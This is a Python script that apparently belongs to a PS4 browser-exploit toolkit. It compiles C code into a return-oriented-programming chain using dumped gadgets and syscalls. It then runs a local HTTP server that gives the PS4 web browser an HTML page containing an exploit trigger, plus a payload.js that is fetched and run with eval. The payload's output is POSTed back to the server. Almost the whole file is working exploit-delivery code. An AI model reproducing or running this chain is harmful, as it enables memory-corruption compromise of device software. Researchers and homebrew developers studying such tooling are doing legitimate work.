import shlex, os.path, sys, tempfile, subprocess, http.server, threading

sources = ' '.join(map(shlex.quote, map(os.path.abspath, sys.argv[1:])))

os.chdir(os.path.split(__file__)[0]+'/..')
js = os.popen('8cc/python/rop-ps4-8cc /dev/stdout librop/*.c printf/*.c ps4/*.c '+sources+' | python3 bad_hoist/rop/compiler.py /dev/stdin bad_hoist/dumps/gadgets.txt').read()

js = ('''\
try
{
%s\
}
catch(e)
{
var printf_ans = ''+e+'\\n'+e.stack;
}
'''%js).encode('utf-8')

HTML = b'''\
<html>
<body onload="go()">
<script>
function print(){}

window.postExploit = function()
{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/payload.js', true);
    xhr.send('');
    xhr.onload = function()
    {
        eval.call(window, xhr.responseText);
    }
};
</script>
<script src="/external/utils.js"></script>
<script src="/external/int64.js"></script>
<script src="/external/ps4.js"></script>
<button id="input1" onfocus="handle2()"></button>
<button id="input2"></button>
<button id="input3" onfocus="handle2()"></button>
<select id="select1">
<option value="value1">Value1</option>
</select>
</body>
</html>
'''

SCRIPTS = [
    'bad_hoist/helpers.js',
    'bad_hoist/malloc.js',
    'bad_hoist/rop/rop.js',
    'bad_hoist/dumps/syscalls.txt',
    'build/syscall_names.txt',
]

TAIL_JS = b'''\
var xxx = new XMLHttpRequest();
xxx.open("POST", "/", true);
xxx.onload = read_ptr_at.bind(window, 0);
xxx.send(printf_ans+'\\nmain() returned '+main_ret);
'''

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/': data = HTML
        elif self.path == '/payload.js':
            data = b''
            for i in SCRIPTS:
                with open(i, 'rb') as file:
                    data += file.read() + b'\n'
            data += js + b'\n'
            data += TAIL_JS
        elif self.path.startswith('/external/') and '..' not in self.path:
            data = open('bad_hoist'+self.path, 'rb').read()
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript' if self.path.endswith('.js') else 'text/html')
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)
    def do_POST(self):
        ll = int(self.headers.get('Content-Length'))
        data = self.rfile.read(ll)
        print(data.decode('utf-8'))
        self.send_error(200)
        threading.Thread(target=self.server.shutdown, daemon=True).start()

print('Navigate the PS4 web browser to port 8080 on this PC')
print('(or just press OK if you are already on error screen)')
http.server.HTTPServer(('', 8080), RequestHandler).serve_forever()
